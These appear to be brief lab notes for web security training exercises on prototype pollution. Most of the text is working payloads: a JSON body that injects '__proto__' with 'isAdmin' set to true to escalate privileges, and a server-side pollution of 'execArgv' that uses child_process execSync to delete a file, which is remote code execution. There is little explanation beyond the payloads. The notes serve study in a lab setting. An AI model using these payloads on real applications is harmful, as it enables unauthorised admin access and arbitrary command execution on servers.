# Use DOM Invader

## if alert() was not triggered:
Click Exploit again. In the new tab that loads, append a minus character (-) to the URL and reload the page. 

==========================================ADMIN ESCALATION=============================================
## Escalation to admin

```
{"address_line_1":"Wiener HQ",
"address_line_2":"One Wiener Way",
"city":"Wienerville",
"postcode":"BU1 1RP",
"country":"UK",
"sessionId":"32rXOzL7o03dJIOblnSFC5mTqd86xack",
"__proto__": {
    "isAdmin":"true"
}}
```

=========================================READ CARLOS/SECRET============================================

## Remote Code Execution

```
"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
    ]
}
```
